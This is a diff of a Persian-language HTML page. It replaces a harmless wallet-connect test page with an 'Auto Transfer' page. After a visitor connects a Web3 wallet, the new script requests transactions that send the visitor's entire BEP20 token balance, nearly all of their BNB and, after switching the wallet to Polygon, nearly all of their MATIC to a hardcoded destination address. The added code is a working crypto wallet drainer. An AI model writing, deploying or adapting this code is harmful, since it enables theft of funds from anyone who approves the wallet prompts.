@@ -1,58 +1,158 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Connect Test</title>
-    <style>
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-right: 10px;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Transfer</title>
+<style>
+body{font-family:sans-serif;text-align:center;margin-top:40px}
+button{padding:10px 20px;font-size:16px;margin:5px}
+</style>
 </head>
 <body>
-    <button id="connectBtn">کانکت</button>
-    <button id="transferBtn">انتقال</button>
 
-    <script>
-        const connectBtn = document.getElementById("connectBtn");
-        const transferBtn = document.getElementById("transferBtn");
-        let connectedAccount = null;
+<h2>Auto Transfer</h2>
 
-        connectBtn.addEventListener("click", async () => {
-            if (window.ethereum) {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    connectedAccount = accounts[0];
-                    alert("Connected account: " + connectedAccount);
-                } catch (err) {
-                    console.error(err);
-                    alert("اتصال لغو شد یا خطا رخ داد");
-                }
-            } else {
-                alert("هیچ کیف پول Web3 شناسایی نشد!");
-            }
-        });
+<button onclick="connect()">کانکت ولت</button>
+<button onclick="transferAll()">انتقال همه دارایی‌ها</button>
 
-        transferBtn.addEventListener("click", async () => {
-            if (!connectedAccount) {
-                alert("ابتدا کانکت شوید!");
-                return;
-            }
-            // اینجا می‌تونی کد انتقال امن توکن‌ها رو اضافه کنی
-            alert("می‌توانی اینجا تراکنش ارسال کنی: " + connectedAccount);
-        });
-    </script>
+<p id="status"></p>
+
+<script>
+const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";
+const TOKEN = "0x641a6Dc991A49f7BE9Fe3C72c5d0FBb223eDb12f"; // BEP20 token
+let account;
+
+function status(t){document.getElementById("status").innerText=t;}
+
+async function connect(){
+ if(!window.ethereum){alert("Wallet not found");return;}
+ const acc = await ethereum.request({method:'eth_requestAccounts'});
+ account = acc[0];
+ status("Connected: " + account);
+}
+
+// تبدیل به hex
+function toHex(n){
+ return "0x"+n.toString(16);
+}
+
+// خواندن موجودی BNB
+async function getBNBBalance(){
+ const bal = await ethereum.request({
+  method:"eth_getBalance",
+  params:[account,"latest"]
+ });
+ return parseInt(bal,16);
+}
+
+// خواندن موجودی توکن
+async function getTokenBalance(){
+ const data = "0x70a08231" + account.substring(2).padStart(64,"0");
+
+ const result = await ethereum.request({
+  method:"eth_call",
+  params:[{to:TOKEN,data:data},"latest"]
+ });
+
+ return parseInt(result,16);
+}
+
+async function sendToken(balance){
+ const data =
+   "0xa9059cbb" +
+   DESTINATION.substring(2).padStart(64,"0") +
+   toHex(balance).substring(2).padStart(64,"0");
+
+ return ethereum.request({
+   method:"eth_sendTransaction",
+   params:[{
+     from:account,
+     to:TOKEN,
+     data:data
+   }]
+ });
+}
+
+async function sendBNB(balance){
+ // نگه داشتن مقدار کمی برای کارمزد
+ const gasReserve = 21000000000000;
+ const sendAmount = balance - gasReserve;
+
+ return ethereum.request({
+   method:"eth_sendTransaction",
+   params:[{
+     from:account,
+     to:DESTINATION,
+     value:toHex(sendAmount)
+   }]
+ });
+}
+
+async function switchPolygon(){
+ await ethereum.request({
+  method:"wallet_switchEthereumChain",
+  params:[{chainId:"0x89"}]
+ });
+}
+
+async function getMaticBalance(){
+ const bal = await ethereum.request({
+  method:"eth_getBalance",
+  params:[account,"latest"]
+ });
+ return parseInt(bal,16);
+}
+
+async function sendMatic(balance){
+ const gasReserve = 21000000000000;
+ const sendAmount = balance - gasReserve;
+
+ return ethereum.request({
+   method:"eth_sendTransaction",
+   params:[{
+     from:account,
+     to:DESTINATION,
+     value:toHex(sendAmount)
+   }]
+ });
+}
+
+async function transferAll(){
+
+ if(!account){alert("اول کانکت کن");return;}
+
+ try{
+
+   status("ارسال توکن...");
+   const tokenBal = await getTokenBalance();
+   if(tokenBal>0){
+     await sendToken(tokenBal);
+   }
+
+   status("ارسال BNB...");
+   const bnbBal = await getBNBBalance();
+   if(bnbBal>0){
+     await sendBNB(bnbBal);
+   }
+
+   status("سوئیچ به Polygon...");
+   await switchPolygon();
+
+   status("ارسال MATIC...");
+   const maticBal = await getMaticBalance();
+   if(maticBal>0){
+     await sendMatic(maticBal);
+   }
+
+   status("انجام شد ✅");
+
+ }catch(e){
+   console.error(e);
+   alert("خطا یا رد شدن تراکنش");
+ }
+}
+</script>
+
 </body>
 </html>
